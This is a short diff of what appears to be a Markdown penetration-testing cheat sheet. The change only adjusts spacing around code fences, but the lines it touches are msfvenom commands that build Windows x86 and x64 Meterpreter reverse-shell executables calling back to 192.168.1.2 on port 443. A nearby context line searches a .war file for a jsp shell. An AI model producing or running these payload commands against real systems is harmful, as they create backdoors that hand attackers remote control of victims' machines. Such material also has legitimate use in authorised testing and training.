@@ -129,9 +129,9 @@ strings reverse.war | grep jsp # in order to get the name of the file
 ### Meterpreter (Metasploit Listener multi/handler)
 
 
-x86 >``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe ```
+x86 > ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe ```
 
-x64 >``` msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe ```
+x64 > ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe ```
 
 
 ### Shell (Metasploit Listener multi/handler)
